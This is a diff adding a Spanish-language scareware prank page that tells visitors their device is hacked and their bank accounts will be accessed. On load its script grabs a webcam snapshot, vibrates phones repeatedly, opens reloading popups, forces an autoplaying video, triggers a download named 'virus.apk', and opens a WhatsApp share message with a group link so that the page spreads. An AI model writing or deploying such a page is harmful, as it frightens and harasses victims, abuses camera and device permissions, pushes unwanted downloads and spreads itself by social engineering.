@@ -1,0 +1,119 @@
+﻿<!DOCTYPE html><html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Hackeado 🔥</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-color: black;
+            color: lime;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 20px;
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #foto {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 150px;
+            height: 150px;
+            border: 2px solid red;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔥 TU DISPOSITIVO HA SIDO HACKEADO 🔥</h1>
+<h1>🔥 Te hemos comprometído 🔥</h1>
+<h1>🔥 en unos segundos accederemos a tus cuentas bancarias  🔥</h1>
+<h1>🔥 somos parte de un nuevo grupo de hackers 🔥</h1>
+<h1>🔥 Nuestro líder es un tipo peligroso el pelón net.  🔥</h1>
+
+
+
+    <p>No intentes cerrar esta ventana...</p>
+    <img id="foto" /><script>
+    // 🚨 Captura de foto con la cámara
+    function capturarFoto() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            let video = document.createElement("video");
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                let canvas = document.createElement("canvas");
+                canvas.width = 150;
+                canvas.height = 150;
+                let ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, 150, 150);
+                document.getElementById("foto").src = canvas.toDataURL("image/png");
+                document.getElementById("foto").style.display = "block";
+                stream.getTracks().forEach(track => track.stop());
+            }, 3000);
+        })
+        .catch(error => console.log("Error accediendo a la cámara"));
+    }
+    setTimeout(capturarFoto, 2000);
+
+    // 📳 Vibración extrema en móviles
+    function vibrar() {
+        if (navigator.vibrate) {
+            setInterval(() => navigator.vibrate([500, 500, 1000]), 5000);
+        }
+    }
+    vibrar();
+
+    // 🔥 Más ventanas emergentes
+    function abrirVentanas() {
+        for (let i = 0; i < 5; i++) {
+            let w = window.open('', '', `width=${200 + i * 100},height=${200 + i * 100}`);
+            if (w) setInterval(() => w.location.reload(), 3000);
+        }
+    }
+    setTimeout(abrirVentanas, 10000);
+
+    // 🚀 Forzar compartir en redes sociales
+    function compartirEnRedes() {
+        let video = document.createElement('iframe');
+
+video.src = 'https://www.youtube.com/embed/GPQhIrp1AJ4?autoplay=1'; video.width = '100%'; video.height = '100%'; video.style.position = 'fixed'; video.style.top = '0'; video.style.left = '0'; video.style.zIndex = '9999'; document.body.appendChild(video); } setTimeout(compartirEnRedes, 15000);
+
+// 🖥️ Falso intento de cambio de fondo en Windows
+    function cambiarFondo() {
+        let body = document.body;
+        setInterval(() => {
+            body.style.backgroundImage = "url('https://i.imgur.com/6RkyrwZ.jpg')";
+            body.style.backgroundSize = "cover";
+        }, 5000);
+    }
+    setTimeout(cambiarFondo, 20000);
+
+    // 📥 Simulación de descarga de APK
+    function simularDescarga() {
+        let link = document.createElement("a");
+        link.href = "https://www.softonic.com/descargar/onlyfans/android/post-descarga"; // URL ficticia
+        link.download = "virus.apk";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+    setTimeout(simularDescarga, 12000);
+
+    // 📩 Envío de mensaje de WhatsApp
+    function enviarMensajeWhatsApp() {
+        let mensaje = encodeURIComponent("¡He sido hackeado! Mira esto:https://chat.whatsapp.com/LQoIRresQmqB55wrqnmb4D");
+        window.open(`https://wa.me/?text=${mensaje}`, '_blank');
+    }
+    setTimeout(enviarMensajeWhatsApp, 18000);
+</script>
+
+</body>
+</html>
+>
